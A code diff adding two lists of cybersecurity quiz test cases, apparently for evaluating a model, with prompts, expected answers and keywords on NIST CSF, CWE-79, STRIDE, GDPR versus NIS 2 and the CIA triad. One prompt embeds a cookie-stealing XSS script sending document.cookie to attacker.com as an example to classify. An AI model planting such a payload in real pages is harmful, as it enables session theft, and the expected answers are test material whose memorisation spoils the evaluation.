@@ -1,0 +1,108 @@
+Normal 
+TEST_CASES = [
+    {
+        "category": "Basic Definitions",
+        "prompt": "What is a security requirement?",
+        "expected_short_answer": "A security requirement is a statement of needed security functionality or a constraint that ensures the security of a system or application.",
+        "expected_keywords": ["statement", "constraint", "functionality", "security"],
+        "source_url": "https://csrc.nist.gov/glossary/term/security_requirement"
+    },
+    {
+        "category": "Frameworks",
+        "prompt": "What are the five core functions of the NIST Cybersecurity Framework (CSF)?",
+        "expected_short_answer": "The five core functions of the NIST CSF are Identify, Protect, Detect, Respond, and Recover.",
+        "expected_keywords": ["identify", "protect", "detect", "respond", "recover"],
+        "source_url": "https://www.nist.gov/cyberframework/framework"
+    },
+    {
+        "category": "Security Controls",
+        "prompt": "Which NIST 800-53 control family is primarily responsible for audit and accountability?",
+        "expected_short_answer": "The 'AU' (Audit and Accountability) control family is responsible for audit logging and related controls.",
+        "expected_keywords": ["au", "audit", "accountability"],
+        "source_url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final"
+    },
+    {
+        "category": "Vulnerabilities",
+        "prompt": "What is CWE-79 and what type of vulnerability does it represent?",
+        "expected_short_answer": "CWE-79 is 'Improper Neutralization of Input During Web Page Generation', commonly known as Cross-Site Scripting (XSS). It's an injection vulnerability.",
+        "expected_keywords": ["cwe-79", "cross-site scripting", "xss", "injection", "neutralization"],
+        "source_url": "https://cwe.mitre.org/data/definitions/79.html"
+    },
+    {
+        "category": "Threat Modeling",
+        "prompt": "What does STRIDE stand for in threat modeling?",
+        "expected_short_answer": "STRIDE stands for Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege.",
+        "expected_keywords": ["spoofing", "tampering", "repudiation", "information disclosure", "denial of service", "elevation of privilege"],
+        "source_url": "https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats"
+    },
+    {
+        "category": "Regulations/Directives",
+        "prompt": "What is the main difference between NIS 2 Directive and GDPR?",
+        "expected_short_answer": "GDPR protects personal data across all sectors, while the NIS 2 Directive focuses on the operational cybersecurity and resilience of critical infrastructure and essential services.",
+        "expected_keywords": ["personal data", "gdpr", "nis 2", "cybersecurity", "resilience", "critical infrastructure"],
+        "source_url": "https://www.enisa.europa.eu/topics/nis-directive"
+    },
+    {
+        "category": "Basic Principles",
+        "prompt": "What does the CIA triad stand for in information security?",
+        "expected_short_answer": "The CIA triad stands for Confidentiality, Integrity, and Availability.",
+        "expected_keywords": ["confidentiality", "integrity", "availability"],
+        "source_url": "https://csrc.nist.gov/glossary/term/confidentiality"
+    }
+]
+
+
+Reverse
+TEST_CASES = [
+    {
+        "category": "Basic Definitions - Identification",
+        "prompt": "Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?",
+        "expected_short_answer": "This statement is a security requirement. Its purpose is to define a specific functionality or constraint (MFA) to protect critical access.",
+        "expected_keywords": ["security requirement", "mfa", "authentication", "constraint", "functionality", "access control"],
+        "source_url": "https://csrc.nist.gov/glossary/term/security_requirement"
+    },
+    {
+        "category": "Frameworks - Application",
+        "prompt": "A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?",
+        "expected_short_answer": "The primary functions demonstrated are 'Respond' (activating the incident plan) and 'Recover' (restoring from backups).",
+        "expected_keywords": ["respond", "recover", "nist", "csf", "incident response", "backup"],
+        "source_url": "https://www.nist.gov/cyberframework/framework"
+    },
+    {
+        "category": "Security Controls - Identification",
+        "prompt": "A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?",
+        "expected_short_answer": "This requirement is addressed by the 'AU' (Audit and Accountability) control family.",
+        "expected_keywords": ["au", "audit", "accountability", "logging", "nist 800-53"],
+        "source_url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final"
+    },
+    {
+        "category": "Vulnerabilities - Identification",
+        "prompt": "A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?",
+        "expected_short_answer": "This vulnerability is known as Cross-Site Scripting (XSS). Its corresponding identifier is CWE-79.",
+        "expected_keywords": ["cwe-79", "cross-site scripting", "xss", "injection", "sanitization", "neutralization"],
+        "source_url": "https://cwe.mitre.org/data/definitions/79.html"
+    },
+    {
+        "category": "Threat Modeling - Classification",
+        "prompt": "During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?",
+        "expected_short_answer": "This threat belongs to the 'Tampering' category of the STRIDE model, as it involves the unauthorized modification of data.",
+        "expected_keywords": ["stride", "tampering", "threat modeling", "integrity", "modify data"],
+        "source_url": "https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats"
+    },
+    {
+        "category": "Regulations/Directives - Application",
+        "prompt": "Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?",
+        "expected_short_answer": "Incident 1 (disruption of critical infrastructure) is primarily a concern for the NIS 2 Directive. Incident 2 (breach of personal data) is a primary concern for GDPR.",
+        "expected_keywords": ["nis 2", "gdpr", "critical infrastructure", "essential service", "personal data", "data breach"],
+        "source_url": "https://www.enisa.europa.eu/topics/nis-directive"
+    },
+    {
+        "category": "Basic Principles - Application",
+        "prompt": "A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?",
+        "expected_short_answer": "This control primarily upholds the principle of 'Integrity'.",
+        "expected_keywords": ["cia triad", "integrity", "checksum", "hash", "data corruption", "alteration"],
+        "source_url": "https://csrc.nist.gov/glossary/term/integrity" 
+    }
+]
+
+# ... (o resto do teu código continua aqui) ...
